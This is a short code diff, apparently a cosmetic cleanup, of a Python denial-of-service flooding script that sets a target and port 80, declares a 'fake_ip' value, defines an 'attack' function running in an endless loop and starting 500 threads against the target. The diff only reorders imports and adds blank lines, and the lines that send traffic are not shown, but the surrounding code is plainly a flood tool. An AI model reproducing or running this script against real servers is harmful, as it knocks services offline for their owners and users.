@@ -1,11 +1,12 @@
-import threading
 import socket
+import threading
 
 target = ''
 port = 80
 fake_ip = '182.21.20.32'
 
 already_connected = 0
+
 
 def attack():
     while True:
@@ -18,6 +19,7 @@ def attack():
         global already_connected
         already_connected += 1
         print(already_connected)
+
 
 for i in range(500):
     thread = threading.Thread(target=attack)
